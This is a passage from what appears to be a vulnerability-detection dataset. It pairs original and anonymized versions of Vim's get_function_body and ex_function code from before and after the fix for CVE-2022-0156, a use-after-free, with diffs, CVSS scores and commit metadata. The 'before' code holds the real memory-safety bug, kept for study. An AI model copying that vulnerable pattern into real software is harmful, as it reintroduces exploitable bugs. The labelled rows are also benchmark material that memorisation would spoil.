		line_arg += STRLEN(line_arg);
	    else
	    {
		*p = NUL;
		line_arg = p + 1;
	    }
	}
	else
	{
	    theline = get_function_line(eap, lines_to_free, indent,
							      getline_options);
	}
	if (KeyTyped)
	    lines_left = Rows - 1;
	if (theline == NULL)
	{
	    // Use the start of the function for the line number.
	    SOURCING_LNUM = sourcing_lnum_top;
	    if (skip_until != NULL)
		semsg(_(e_missing_heredoc_end_marker_str), skip_until);
	    else if (nesting_inline[nesting])
		emsg(_(e_missing_end_block));
	    else if (eap->cmdidx == CMD_def)
		emsg(_(e_missing_enddef));
	    else
		emsg(_(e_missing_endfunction));
	    goto theend;
	}

	// Detect line continuation: SOURCING_LNUM increased more than one.
	sourcing_lnum_off = get_sourced_lnum(eap->getline, eap->cookie);
	if (SOURCING_LNUM < sourcing_lnum_off)
	    sourcing_lnum_off -= SOURCING_LNUM;
	else
	    sourcing_lnum_off = 0;

	if (skip_until != NULL)
	{
	    // Don't check for "":endfunc""/"":enddef"" between
	    // * "":append"" and "".""
	    // * "":python <<EOF"" and ""EOF""
	    // * "":let {var-name} =<< [trim] {marker}"" and ""{marker}""
	    if (heredoc_trimmed == NULL
		    || (is_heredoc && skipwhite(theline) == theline)
		    || STRNCMP(theline, heredoc_trimmed,
						 STRLEN(heredoc_trimmed)) == 0)
	    {
		if (heredoc_trimmed == NULL)
		    p = theline;
		else if (is_heredoc)
		    p = skipwhite(theline) == theline
				 ? theline : theline + STRLEN(heredoc_trimmed);
		else
		    p = theline + STRLEN(heredoc_trimmed);
		if (STRCMP(p, skip_until) == 0)
		{
		    VIM_CLEAR(skip_until);
		    VIM_CLEAR(heredoc_trimmed);
		    getline_options = vim9_function
				? GETLINE_CONCAT_CONTBAR : GETLINE_CONCAT_CONT;
		    is_heredoc = FALSE;

		    if (heredoc_concat_len > 0)
		    {
			// Replace the starting line with all the concatenated
			// lines.
			ga_concat(&heredoc_ga, theline);
			vim_free(((char_u **)(newlines->ga_data))[
						      heredoc_concat_len - 1]);
			((char_u **)(newlines->ga_data))[
				  heredoc_concat_len - 1] = heredoc_ga.ga_data;
			ga_init(&heredoc_ga);
			heredoc_concat_len = 0;
			theline += STRLEN(theline);  // skip the ""EOF""
		    }
		}
	    }
	}
	else
	{
	    int	    c;
	    char_u  *end;

	    // skip ':' and blanks
	    for (p = theline; VIM_ISWHITE(*p) || *p == ':'; ++p)
		;

	    // Check for ""endfunction"", ""enddef"" or ""}"".
	    // When a "":"" follows it must be a dict key; ""enddef: value,""
	    if (nesting_inline[nesting]
		    ? *p == '}'
		    : (checkforcmd(&p, nesting_def[nesting]
						? ""enddef"" : ""endfunction"", 4)
			&& *p != ':'))
	    {
		if (nesting-- == 0)
		{
		    char_u *nextcmd = NULL;

		    if (*p == '|' || *p == '}')
			nextcmd = p + 1;
		    else if (line_arg != NULL && *skipwhite(line_arg) != NUL)
			nextcmd = line_arg;
		    else if (*p != NUL && *p != (vim9_function ? '#' : '""')
					   && (vim9_function || p_verbose > 0))
		    {
			SOURCING_LNUM = sourcing_lnum_top
							+ newlines->ga_len + 1;
			if (eap->cmdidx == CMD_def)
			    semsg(_(e_text_found_after_str_str), ""enddef"", p);
			else
			    give_warning2((char_u *)
				   _(""W22: Text found after :endfunction: %s""),
				   p, TRUE);
		    }
		    if (nextcmd != NULL && *skipwhite(nextcmd) != NUL)
		    {
			// Another command follows. If the line came from ""eap""
			// we can simply point into it, otherwise we need to
			// change ""eap->cmdlinep"" to point to the last fetched
			// line.
			eap->nextcmd = nextcmd;
			if (lines_to_free->ga_len > 0
				&& *eap->cmdlinep !=
					    ((char_u **)lines_to_free->ga_data)
						   [lines_to_free->ga_len - 1])
			{
			    // *cmdlinep will be freed later, thus remove the
			    // line from lines_to_free.
			    vim_free(*eap->cmdlinep);
			    *eap->cmdlinep = ((char_u **)lines_to_free->ga_data)
						   [lines_to_free->ga_len - 1];
			    --lines_to_free->ga_len;
			}
		    }
		    break;
		}
	    }

	    // Check for mismatched ""endfunc"" or ""enddef"".
	    // We don't check for ""def"" inside ""func"" thus we also can't check
	    // for ""enddef"".
	    // We continue to find the end of the function, although we might
	    // not find it.
	    else if (nesting_def[nesting])
	    {
		if (checkforcmd(&p, ""endfunction"", 4) && *p != ':')
		    emsg(_(e_mismatched_endfunction));
	    }
	    else if (eap->cmdidx == CMD_def && checkforcmd(&p, ""enddef"", 4))
		emsg(_(e_mismatched_enddef));

	    // Increase indent inside ""if"", ""while"", ""for"" and ""try"", decrease
	    // at ""end"".
	    if (indent > 2 && (*p == '}' || STRNCMP(p, ""end"", 3) == 0))
		indent -= 2;
	    else if (STRNCMP(p, ""if"", 2) == 0
		    || STRNCMP(p, ""wh"", 2) == 0
		    || STRNCMP(p, ""for"", 3) == 0
		    || STRNCMP(p, ""try"", 3) == 0)
		indent += 2;

	    // Check for defining a function inside this function.
	    // Only recognize ""def"" inside ""def"", not inside ""function"",
	    // For backwards compatibility, see Test_function_python().
	    c = *p;
	    if (is_function_cmd(&p)
		    || (eap->cmdidx == CMD_def && checkforcmd(&p, ""def"", 3)))
	    {
		if (*p == '!')
		    p = skipwhite(p + 1);
		p += eval_fname_script(p);
		vim_free(trans_function_name(&p, NULL, TRUE, 0, NULL,
								  NULL, NULL));
		if (*skipwhite(p) == '(')
		{
		    if (nesting == MAX_FUNC_NESTING - 1)
			emsg(_(e_function_nesting_too_deep));
		    else
		    {
			++nesting;
			nesting_def[nesting] = (c == 'd');
			nesting_inline[nesting] = FALSE;
			indent += 2;
		    }
		}
	    }

	    if (nesting_def[nesting] ? *p != '#' : *p != '""')
	    {
		// Not a comment line: check for nested inline function.
		end = p + STRLEN(p) - 1;
		while (end > p && VIM_ISWHITE(*end))
		    --end;
		if (end > p + 1 && *end == '{' && VIM_ISWHITE(end[-1]))
		{
		    int	    is_block;

		    // check for trailing ""=> {"": start of an inline function
		    --end;
		    while (end > p && VIM_ISWHITE(*end))
			--end;
		    is_block = end > p + 2 && end[-1] == '=' && end[0] == '>';
		    if (!is_block)
		    {
			char_u *s = p;

			// check for line starting with ""au"" for :autocmd or
			// ""com"" for :command, these can use a {} block
			is_block = checkforcmd_noparen(&s, ""autocmd"", 2)
				      || checkforcmd_noparen(&s, ""command"", 3);
		    }

		    if (is_block)
		    {
			if (nesting == MAX_FUNC_NESTING - 1)
			    emsg(_(e_function_nesting_too_deep));
			else
			{
			    ++nesting;
			    nesting_def[nesting] = TRUE;
			    nesting_inline[nesting] = TRUE;
			    indent += 2;
			}
		    }
		}
	    }

	    // Check for "":append"", "":change"", "":insert"".  Not for :def.
	    p = skip_range(p, FALSE, NULL);
	    if (!vim9_function
		&& ((p[0] == 'a' && (!ASCII_ISALPHA(p[1]) || p[1] == 'p'))
		    || (p[0] == 'c'
			&& (!ASCII_ISALPHA(p[1]) || (p[1] == 'h'
				&& (!ASCII_ISALPHA(p[2]) || (p[2] == 'a'
					&& (STRNCMP(&p[3], ""nge"", 3) != 0
					    || !ASCII_ISALPHA(p[6])))))))
		    || (p[0] == 'i'
			&& (!ASCII_ISALPHA(p[1]) || (p[1] == 'n'
				&& (!ASCII_ISALPHA(p[2])
				    || (p[2] == 's'
					&& (!ASCII_ISALPHA(p[3])
						|| p[3] == 'e'))))))))
		skip_until = vim_strsave((char_u *)""."");

	    // Check for "":python <<EOF"", "":tcl <<EOF"", etc.
	    arg = skipwhite(skiptowhite(p));
	    if (arg[0] == '<' && arg[1] =='<'
		    && ((p[0] == 'p' && p[1] == 'y'
				    && (!ASCII_ISALNUM(p[2]) || p[2] == 't'
					|| ((p[2] == '3' || p[2] == 'x')
						   && !ASCII_ISALPHA(p[3]))))
			|| (p[0] == 'p' && p[1] == 'e'
				    && (!ASCII_ISALPHA(p[2]) || p[2] == 'r'))
			|| (p[0] == 't' && p[1] == 'c'
				    && (!ASCII_ISALPHA(p[2]) || p[2] == 'l'))
			|| (p[0] == 'l' && p[1] == 'u' && p[2] == 'a'
				    && !ASCII_ISALPHA(p[3]))
			|| (p[0] == 'r' && p[1] == 'u' && p[2] == 'b'
				    && (!ASCII_ISALPHA(p[3]) || p[3] == 'y'))
			|| (p[0] == 'm' && p[1] == 'z'
				    && (!ASCII_ISALPHA(p[2]) || p[2] == 's'))
			))
	    {
		// "":python <<"" continues until a dot, like "":append""
		p = skipwhite(arg + 2);
		if (STRNCMP(p, ""trim"", 4) == 0)
		{
		    // Ignore leading white space.
		    p = skipwhite(p + 4);
		    heredoc_trimmed = vim_strnsave(theline,
						 skipwhite(theline) - theline);
		}
		if (*p == NUL)
		    skip_until = vim_strsave((char_u *)""."");
		else
		    skip_until = vim_strnsave(p, skiptowhite(p) - p);
		getline_options = GETLINE_NONE;
		is_heredoc = TRUE;
		if (eap->cmdidx == CMD_def)
		    heredoc_concat_len = newlines->ga_len + 1;
	    }

	    // Check for "":cmd v =<< [trim] EOF""
	    //       and "":cmd [a, b] =<< [trim] EOF""
	    //       and ""lines =<< [trim] EOF"" for Vim9
	    // Where ""cmd"" can be ""let"", ""var"", ""final"" or ""const"".
	    arg = skipwhite(skiptowhite(p));
	    if (*arg == '[')
		arg = vim_strchr(arg, ']');
	    if (arg != NULL)
	    {
		int found = (eap->cmdidx == CMD_def && arg[0] == '='
					     && arg[1] == '<' && arg[2] =='<');

		if (!found)
		    // skip over the argument after ""cmd""
		    arg = skipwhite(skiptowhite(arg));
		if (found || (arg[0] == '=' && arg[1] == '<' && arg[2] =='<'
			&& (checkforcmd(&p, ""let"", 2)
			    || checkforcmd(&p, ""var"", 3)
			    || checkforcmd(&p, ""final"", 5)
			    || checkforcmd(&p, ""const"", 5))))
		{
		    p = skipwhite(arg + 3);
		    if (STRNCMP(p, ""trim"", 4) == 0)
		    {
			// Ignore leading white space.
			p = skipwhite(p + 4);
			heredoc_trimmed = vim_strnsave(theline,
						 skipwhite(theline) - theline);
		    }
		    skip_until = vim_strnsave(p, skiptowhite(p) - p);
		    getline_options = GETLINE_NONE;
		    is_heredoc = TRUE;
		}
	    }
	}

	// Add the line to the function.
	if (ga_grow(newlines, 1 + sourcing_lnum_off) == FAIL)
	    goto theend;

	if (heredoc_concat_len > 0)
	{
	    // For a :def function ""python << EOF"" concatenates all the lines,
	    // to be used for the instruction later.
	    ga_concat(&heredoc_ga, theline);
	    ga_concat(&heredoc_ga, (char_u *)""\n"");
	    p = vim_strsave((char_u *)"""");
	}
	else
	{
	    // Copy the line to newly allocated memory.  get_one_sourceline()
	    // allocates 250 bytes per line, this saves 80% on average.  The
	    // cost is an extra alloc/free.
	    p = vim_strsave(theline);
	}
	if (p == NULL)
	    goto theend;
	((char_u **)(newlines->ga_data))[newlines->ga_len++] = p;

	// Add NULL lines for continuation lines, so that the line count is
	// equal to the index in the growarray.
	while (sourcing_lnum_off-- > 0)
	    ((char_u **)(newlines->ga_data))[newlines->ga_len++] = NULL;

	// Check for end of eap->arg.
	if (line_arg != NULL && *line_arg == NUL)
	    line_arg = NULL;
    }

    // Return OK when no error was detected.
    if (!did_emsg)
	ret = OK;

theend:
    vim_free(skip_until);
    vim_free(heredoc_trimmed);
    vim_free(heredoc_ga.ga_data);
    need_wait_return |= saved_wait_return;
    return ret;
}","static int
get_function_body(
	exarg_T	    *VAR_0,
	garray_T    *VAR_1,
	char_u	    *VAR_2,
	garray_T    *VAR_3)
{
    linenr_T	VAR_4 = VAR_5;
    linenr_T	VAR_6;
    int		VAR_7 = VAR_8;
    char_u	*VAR_9 = VAR_2;
    int		VAR_10 = VAR_0->cmdidx == VAR_11
						   || VAR_0->cmdidx == VAR_12;
#define VAR_13 50
    char	VAR_14[VAR_13];
    char	VAR_15[VAR_13];
    int		VAR_16 = 0;
    getline_opt_T VAR_17;
    int		VAR_18 = 2;
    char_u	*VAR_19 = NULL;
    int		VAR_20 = VAR_21;
    int		VAR_22 = FALSE;
    int		VAR_23 = 0;
    garray_T	VAR_24;
    char_u	*VAR_25 = NULL;

    ga_init2(&VAR_24, 1, 500);

    /* COMMENT_0 */
    /* COMMENT_1 */
    VAR_6 = get_sourced_lnum(VAR_0->getline, VAR_0->cookie);
    if (VAR_5 < VAR_6)
    {
	VAR_6 -= VAR_5;
	if (ga_grow(VAR_1, VAR_6) == VAR_21)
	    goto theend;
	while (VAR_6-- > 0)
	    ((char_u **)(VAR_1->ga_data))[VAR_1->ga_len++] = NULL;
    }

    VAR_14[0] = VAR_10;
    VAR_15[0] = VAR_0->cmdidx == VAR_12;
    VAR_17 = VAR_10
				? VAR_26 : VAR_27;
    for (;;)
    {
	char_u	*VAR_28;
	char_u	*VAR_29;
	char_u	*VAR_30;

	if (VAR_31)
	{
	    VAR_32 = TRUE;
	    VAR_7 = FALSE;
	}
	VAR_8 = FALSE;

	if (VAR_9 != NULL)
	{
	    /* COMMENT_2 */
	    VAR_28 = VAR_9;
	    VAR_29 = vim_strchr(VAR_28, '\n');
	    if (VAR_29 == NULL)
		VAR_9 += STRLEN(VAR_9);
	    else
	    {
		*VAR_29 = VAR_33;
		VAR_9 = VAR_29 + 1;
	    }
	}
	else
	{
	    VAR_28 = get_function_line(VAR_0, VAR_3, VAR_18,
							      VAR_17);
	}
	if (VAR_31)
	    VAR_34 = VAR_35 - 1;
	if (VAR_28 == NULL)
	{
	    /* COMMENT_3 */
	    VAR_5 = VAR_4;
	    if (VAR_19 != NULL)
		semsg(_(VAR_36), VAR_19);
	    else if (VAR_15[VAR_16])
		emsg(_(VAR_37));
	    else if (VAR_0->cmdidx == VAR_11)
		emsg(_(VAR_38));
	    else
		emsg(_(VAR_39));
	    goto theend;
	}

	/* COMMENT_4 */
	VAR_6 = get_sourced_lnum(VAR_0->getline, VAR_0->cookie);
	if (VAR_5 < VAR_6)
	    VAR_6 -= VAR_5;
	else
	    VAR_6 = 0;

	if (VAR_19 != NULL)
	{
	    /* COMMENT_5 */
	    /* COMMENT_6 */
	    /* COMMENT_7 */
	    /* COMMENT_8 */
	    if (VAR_25 == NULL
		    || (VAR_22 && skipwhite(VAR_28) == VAR_28)
		    || STRNCMP(VAR_28, VAR_25,
						 STRLEN(VAR_25)) == 0)
	    {
		if (VAR_25 == NULL)
		    VAR_29 = VAR_28;
		else if (VAR_22)
		    VAR_29 = skipwhite(VAR_28) == VAR_28
				 ? VAR_28 : VAR_28 + STRLEN(VAR_25);
		else
		    VAR_29 = VAR_28 + STRLEN(VAR_25);
		if (STRCMP(VAR_29, VAR_19) == 0)
		{
		    VIM_CLEAR(VAR_19);
		    VIM_CLEAR(VAR_25);
		    VAR_17 = VAR_10
				? VAR_26 : VAR_27;
		    VAR_22 = FALSE;

		    if (VAR_23 > 0)
		    {
			/* COMMENT_9 */
			/* COMMENT_10 */
			ga_concat(&VAR_24, VAR_28);
			vim_free(((char_u **)(VAR_1->ga_data))[
						      VAR_23 - 1]);
			((char_u **)(VAR_1->ga_data))[
				  VAR_23 - 1] = VAR_24.ga_data;
			ga_init(&VAR_24);
			VAR_23 = 0;
			VAR_28 += STRLEN(VAR_28);  /* COMMENT_11 */
		    }
		}
	    }
	}
	else
	{
	    int	    VAR_40;
	    char_u  *VAR_41;

	    /* COMMENT_12 */
	    for (VAR_29 = VAR_28; VIM_ISWHITE(*VAR_29) || *VAR_29 == ':'; ++VAR_29)
		;

	    /* COMMENT_13 */
	    /* COMMENT_14 */
	    if (VAR_15[VAR_16]
		    ? *VAR_29 == '}'
		    : (checkforcmd(&VAR_29, VAR_14[VAR_16]
						? ""enddef"" : ""endfunction"", 4)
			&& *VAR_29 != ':'))
	    {
		if (VAR_16-- == 0)
		{
		    char_u *VAR_42 = NULL;

		    if (*VAR_29 == '|' || *VAR_29 == '}')
			VAR_42 = VAR_29 + 1;
		    else if (VAR_9 != NULL && *skipwhite(VAR_9) != VAR_33)
			VAR_42 = VAR_9;
		    else if (*VAR_29 != VAR_33 && *VAR_29 != (VAR_10 ? '#' : '""')
					   && (VAR_10 || VAR_43 > 0))
		    {
			VAR_5 = VAR_4
							+ VAR_1->ga_len + 1;
			if (VAR_0->cmdidx == VAR_11)
			    semsg(_(VAR_44), ""enddef"", VAR_29);
			else
			    give_warning2((char_u *)
				   _(""W22: Text found after :endfunction: %s""),
				   VAR_29, TRUE);
		    }
		    if (VAR_42 != NULL && *skipwhite(VAR_42) != VAR_33)
		    {
			/* COMMENT_15 */
			/* COMMENT_16 */
			/* COMMENT_17 */
			/* COMMENT_18 */
			VAR_0->nextcmd = VAR_42;
			if (VAR_3->ga_len > 0
				&& *VAR_0->cmdlinep !=
					    ((char_u **)VAR_3->ga_data)
						   [VAR_3->ga_len - 1])
			{
			    /* COMMENT_19 */
			    /* COMMENT_20 */
			    vim_free(*VAR_0->cmdlinep);
			    *VAR_0->cmdlinep = ((char_u **)VAR_3->ga_data)
						   [VAR_3->ga_len - 1];
			    --VAR_3->ga_len;
			}
		    }
		    break;
		}
	    }

	    /* COMMENT_21 */
	    /* COMMENT_22 */
	    /* COMMENT_23 */
	    /* COMMENT_24 */
	    /* COMMENT_25 */
	    else if (VAR_14[VAR_16])
	    {
		if (checkforcmd(&VAR_29, ""endfunction"", 4) && *VAR_29 != ':')
		    emsg(_(VAR_45));
	    }
	    else if (VAR_0->cmdidx == VAR_11 && checkforcmd(&VAR_29, ""enddef"", 4))
		emsg(_(VAR_46));

	    /* COMMENT_26 */
	    /* COMMENT_27 */
	    if (VAR_18 > 2 && (*VAR_29 == '}' || STRNCMP(VAR_29, ""end"", 3) == 0))
		VAR_18 -= 2;
	    else if (STRNCMP(VAR_29, ""if"", 2) == 0
		    || STRNCMP(VAR_29, ""wh"", 2) == 0
		    || STRNCMP(VAR_29, ""for"", 3) == 0
		    || STRNCMP(VAR_29, ""try"", 3) == 0)
		VAR_18 += 2;

	    /* COMMENT_28 */
	    /* COMMENT_29 */
	    /* COMMENT_30 */
	    VAR_40 = *VAR_29;
	    if (is_function_cmd(&VAR_29)
		    || (VAR_0->cmdidx == VAR_11 && checkforcmd(&VAR_29, ""def"", 3)))
	    {
		if (*VAR_29 == '!')
		    VAR_29 = skipwhite(VAR_29 + 1);
		VAR_29 += eval_fname_script(VAR_29);
		vim_free(trans_function_name(&VAR_29, NULL, TRUE, 0, NULL,
								  NULL, NULL));
		if (*skipwhite(VAR_29) == '(')
		{
		    if (VAR_16 == VAR_13 - 1)
			emsg(_(VAR_47));
		    else
		    {
			++VAR_16;
			VAR_14[VAR_16] = (VAR_40 == 'd');
			VAR_15[VAR_16] = FALSE;
			VAR_18 += 2;
		    }
		}
	    }

	    if (VAR_14[VAR_16] ? *VAR_29 != '#' : *VAR_29 != '""')
	    {
		/* COMMENT_31 */
		VAR_41 = VAR_29 + STRLEN(VAR_29) - 1;
		while (VAR_41 > VAR_29 && VIM_ISWHITE(*VAR_41))
		    --VAR_41;
		if (VAR_41 > VAR_29 + 1 && *VAR_41 == '{' && VIM_ISWHITE(VAR_41[-1]))
		{
		    int	    VAR_48;

		    /* COMMENT_32 */
		    --VAR_41;
		    while (VAR_41 > VAR_29 && VIM_ISWHITE(*VAR_41))
			--VAR_41;
		    VAR_48 = VAR_41 > VAR_29 + 2 && VAR_41[-1] == '=' && VAR_41[0] == '>';
		    if (!VAR_48)
		    {
			char_u *VAR_49 = VAR_29;

			/* COMMENT_33 */
			/* COMMENT_34 */
			VAR_48 = checkforcmd_noparen(&VAR_49, ""autocmd"", 2)
				      || checkforcmd_noparen(&VAR_49, ""command"", 3);
		    }

		    if (VAR_48)
		    {
			if (VAR_16 == VAR_13 - 1)
			    emsg(_(VAR_47));
			else
			{
			    ++VAR_16;
			    VAR_14[VAR_16] = TRUE;
			    VAR_15[VAR_16] = TRUE;
			    VAR_18 += 2;
			}
		    }
		}
	    }

	    /* COMMENT_35 */
	    VAR_29 = skip_range(VAR_29, FALSE, NULL);
	    if (!VAR_10
		&& ((VAR_29[0] == 'a' && (!ASCII_ISALPHA(VAR_29[1]) || VAR_29[1] == 'p'))
		    || (VAR_29[0] == 'c'
			&& (!ASCII_ISALPHA(VAR_29[1]) || (VAR_29[1] == 'h'
				&& (!ASCII_ISALPHA(VAR_29[2]) || (VAR_29[2] == 'a'
					&& (STRNCMP(&VAR_29[3], ""nge"", 3) != 0
					    || !ASCII_ISALPHA(VAR_29[6])))))))
		    || (VAR_29[0] == 'i'
			&& (!ASCII_ISALPHA(VAR_29[1]) || (VAR_29[1] == 'n'
				&& (!ASCII_ISALPHA(VAR_29[2])
				    || (VAR_29[2] == 's'
					&& (!ASCII_ISALPHA(VAR_29[3])
						|| VAR_29[3] == 'e'))))))))
		VAR_19 = vim_strsave((char_u *)""."");

	    /* COMMENT_36 */
	    VAR_30 = skipwhite(skiptowhite(VAR_29));
	    if (VAR_30[0] == '<' && VAR_30[1] =='<'
		    && ((VAR_29[0] == 'p' && VAR_29[1] == 'y'
				    && (!ASCII_ISALNUM(VAR_29[2]) || VAR_29[2] == 't'
					|| ((VAR_29[2] == '3' || VAR_29[2] == 'x')
						   && !ASCII_ISALPHA(VAR_29[3]))))
			|| (VAR_29[0] == 'p' && VAR_29[1] == 'e'
				    && (!ASCII_ISALPHA(VAR_29[2]) || VAR_29[2] == 'r'))
			|| (VAR_29[0] == 't' && VAR_29[1] == 'c'
				    && (!ASCII_ISALPHA(VAR_29[2]) || VAR_29[2] == 'l'))
			|| (VAR_29[0] == 'l' && VAR_29[1] == 'u' && VAR_29[2] == 'a'
				    && !ASCII_ISALPHA(VAR_29[3]))
			|| (VAR_29[0] == 'r' && VAR_29[1] == 'u' && VAR_29[2] == 'b'
				    && (!ASCII_ISALPHA(VAR_29[3]) || VAR_29[3] == 'y'))
			|| (VAR_29[0] == 'm' && VAR_29[1] == 'z'
				    && (!ASCII_ISALPHA(VAR_29[2]) || VAR_29[2] == 's'))
			))
	    {
		/* COMMENT_37 */
		VAR_29 = skipwhite(VAR_30 + 2);
		if (STRNCMP(VAR_29, ""trim"", 4) == 0)
		{
		    /* COMMENT_38 */
		    VAR_29 = skipwhite(VAR_29 + 4);
		    VAR_25 = vim_strnsave(VAR_28,
						 skipwhite(VAR_28) - VAR_28);
		}
		if (*VAR_29 == VAR_33)
		    VAR_19 = vim_strsave((char_u *)""."");
		else
		    VAR_19 = vim_strnsave(VAR_29, skiptowhite(VAR_29) - VAR_29);
		VAR_17 = VAR_50;
		VAR_22 = TRUE;
		if (VAR_0->cmdidx == VAR_11)
		    VAR_23 = VAR_1->ga_len + 1;
	    }

	    /* COMMENT_39 */
	    /* COMMENT_40 */
	    /* COMMENT_41 */
	    /* COMMENT_42 */
	    VAR_30 = skipwhite(skiptowhite(VAR_29));
	    if (*VAR_30 == '[')
		VAR_30 = vim_strchr(VAR_30, ']');
	    if (VAR_30 != NULL)
	    {
		int VAR_51 = (VAR_0->cmdidx == VAR_11 && VAR_30[0] == '='
					     && VAR_30[1] == '<' && VAR_30[2] =='<');

		if (!VAR_51)
		    /* COMMENT_43 */
		    VAR_30 = skipwhite(skiptowhite(VAR_30));
		if (VAR_51 || (VAR_30[0] == '=' && VAR_30[1] == '<' && VAR_30[2] =='<'
			&& (checkforcmd(&VAR_29, ""let"", 2)
			    || checkforcmd(&VAR_29, ""var"", 3)
			    || checkforcmd(&VAR_29, ""final"", 5)
			    || checkforcmd(&VAR_29, ""const"", 5))))
		{
		    VAR_29 = skipwhite(VAR_30 + 3);
		    if (STRNCMP(VAR_29, ""trim"", 4) == 0)
		    {
			/* COMMENT_38 */
			VAR_29 = skipwhite(VAR_29 + 4);
			VAR_25 = vim_strnsave(VAR_28,
						 skipwhite(VAR_28) - VAR_28);
		    }
		    VAR_19 = vim_strnsave(VAR_29, skiptowhite(VAR_29) - VAR_29);
		    VAR_17 = VAR_50;
		    VAR_22 = TRUE;
		}
	    }
	}

	/* COMMENT_44 */
	if (ga_grow(VAR_1, 1 + VAR_6) == VAR_21)
	    goto theend;

	if (VAR_23 > 0)
	{
	    /* COMMENT_45 */
	    /* COMMENT_46 */
	    ga_concat(&VAR_24, VAR_28);
	    ga_concat(&VAR_24, (char_u *)""\n"");
	    VAR_29 = vim_strsave((char_u *)"""");
	}
	else
	{
	    /* COMMENT_47 */
	    /* COMMENT_48 */
	    /* COMMENT_49 */
	    VAR_29 = vim_strsave(VAR_28);
	}
	if (VAR_29 == NULL)
	    goto theend;
	((char_u **)(VAR_1->ga_data))[VAR_1->ga_len++] = VAR_29;

	/* COMMENT_50 */
	/* COMMENT_51 */
	while (VAR_6-- > 0)
	    ((char_u **)(VAR_1->ga_data))[VAR_1->ga_len++] = NULL;

	/* COMMENT_52 */
	if (VAR_9 != NULL && *VAR_9 == VAR_33)
	    VAR_9 = NULL;
    }

    /* COMMENT_53 */
    if (!VAR_52)
	VAR_20 = VAR_53;

theend:
    vim_free(VAR_19);
    vim_free(VAR_25);
    vim_free(VAR_24.ga_data);
    VAR_8 |= VAR_7;
    return VAR_20;
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/userfunc.c/vul/after/3.json,"--- func_before
+++ func_after
@@ -3,7 +3,7 @@
 	exarg_T	    *eap,
 	garray_T    *newlines,
 	char_u	    *line_arg_in,
-	char_u	    **line_to_free)
+	garray_T    *lines_to_free)
 {
     linenr_T	sourcing_lnum_top = SOURCING_LNUM;
     linenr_T	sourcing_lnum_off;
@@ -70,7 +70,7 @@
 	}
 	else
 	{
-	    theline = get_function_line(eap, line_to_free, indent,
+	    theline = get_function_line(eap, lines_to_free, indent,
 							      getline_options);
 	}
 	if (KeyTyped)
@@ -180,14 +180,20 @@
 		    {
 			// Another command follows. If the line came from ""eap""
 			// we can simply point into it, otherwise we need to
-			// change ""eap->cmdlinep"".
+			// change ""eap->cmdlinep"" to point to the last fetched
+			// line.
 			eap->nextcmd = nextcmd;
-			if (*line_to_free != NULL
-					    && *eap->cmdlinep != *line_to_free)
+			if (lines_to_free->ga_len > 0
+				&& *eap->cmdlinep !=
+					    ((char_u **)lines_to_free->ga_data)
+						   [lines_to_free->ga_len - 1])
 			{
+			    // *cmdlinep will be freed later, thus remove the
+			    // line from lines_to_free.
 			    vim_free(*eap->cmdlinep);
-			    *eap->cmdlinep = *line_to_free;
-			    *line_to_free = NULL;
+			    *eap->cmdlinep = ((char_u **)lines_to_free->ga_data)
+						   [lines_to_free->ga_len - 1];
+			    --lines_to_free->ga_len;
 			}
 		    }
 		    break;","{'deleted_lines': ['\tchar_u\t    **line_to_free)', '\t    theline = get_function_line(eap, line_to_free, indent,', '\t\t\t// change ""eap->cmdlinep"".', '\t\t\tif (*line_to_free != NULL', '\t\t\t\t\t    && *eap->cmdlinep != *line_to_free)', '\t\t\t    *eap->cmdlinep = *line_to_free;', '\t\t\t    *line_to_free = NULL;'], 'added_lines': ['\tgarray_T    *lines_to_free)', '\t    theline = get_function_line(eap, lines_to_free, indent,', '\t\t\t// change ""eap->cmdlinep"" to point to the last fetched', '\t\t\t// line.', '\t\t\tif (lines_to_free->ga_len > 0', '\t\t\t\t&& *eap->cmdlinep !=', '\t\t\t\t\t    ((char_u **)lines_to_free->ga_data)', '\t\t\t\t\t\t   [lines_to_free->ga_len - 1])', '\t\t\t    // *cmdlinep will be freed later, thus remove the', '\t\t\t    // line from lines_to_free.', '\t\t\t    *eap->cmdlinep = ((char_u **)lines_to_free->ga_data)', '\t\t\t\t\t\t   [lines_to_free->ga_len - 1];', '\t\t\t    --lines_to_free->ga_len;']}",True,vim is vulnerable to Use After Free,5.5,MEDIUM,1,valid,2022-01-08T15:39:39Z,4
CVE-2022-0156,['CWE-416'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,vim,"patch 8.2.4040: keeping track of allocated lines is too complicated

Problem:    Keeping track of allocated lines in user functions is too
            complicated.
Solution:   Instead of freeing individual lines keep them all until the end.",9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,https://github.com/vim/vim/commit/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f,src/userfunc.c,ex_function,"void
ex_function(exarg_T *eap)
{
char_u *line_to_free = NULL;
(void)define_function(eap, NULL, &line_to_free);
vim_free(line_to_free);
}","void
ex_function(exarg_T *VAR_0)
{
char_u *VAR_1 = NULL;
(void)define_function(VAR_0, NULL, &VAR_1);
vim_free(VAR_1);
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/userfunc.c/vul/before/4.json,"void
ex_function(exarg_T *eap)
{
    garray_T lines_to_free;

    ga_init2(&lines_to_free, sizeof(char_u *), 50);
    (void)define_function(eap, NULL, &lines_to_free);
    ga_clear_strings(&lines_to_free);
}","void
ex_function(exarg_T *VAR_0)
{
    garray_T VAR_1;

    ga_init2(&VAR_1, sizeof(char_u *), 50);
    (void)define_function(VAR_0, NULL, &VAR_1);
    ga_clear_strings(&VAR_1);
}",vim/9f1a39a5d1cd7989ada2d1cb32f97d84360e050f/userfunc.c/vul/after/4.json,"--- func_before
+++ func_after
@@ -1,8 +1,9 @@
 void
 ex_function(exarg_T *eap)
 {
-    char_u *line_to_free = NULL;
+    garray_T lines_to_free;
 
-    (void)define_function(eap, NULL, &line_to_free);
-    vim_free(line_to_free);
+    ga_init2(&lines_to_free, sizeof(char_u *), 50);
+    (void)define_function(eap, NULL, &lines_to_free);
+    ga_clear_strings(&lines_to_free);
 }","{'deleted_lines': ['    char_u *line_to_free = NULL;', '    (void)define_function(eap, NULL, &line_to_free);', '    vim_free(line_to_free);'], 'added_lines': ['    garray_T lines_to_free;', '    ga_init2(&lines_to_free, sizeof(char_u *), 50);', '    (void)define_function(eap, NULL, &lines_to_free);', '    ga_clear_strings(&lines_to_free);']}",True,vim is vulnerable to Use After Free,5.5,MEDIUM,1,valid,2022-01-08T15:39:39Z,4
CVE-2022-0156,['CWE-416'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,vim,"patch 8.2.4040: keeping track of allocated lines is too complicated
